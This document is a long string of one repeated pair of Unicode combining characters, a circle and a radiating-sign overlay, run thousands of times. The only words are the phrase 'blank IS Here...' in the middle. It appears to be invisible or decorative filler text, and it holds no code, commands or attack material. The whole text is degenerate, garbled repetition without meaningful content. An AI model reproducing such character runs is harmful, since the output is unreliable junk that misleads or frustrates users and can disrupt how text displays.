҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝blank IS Here...҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉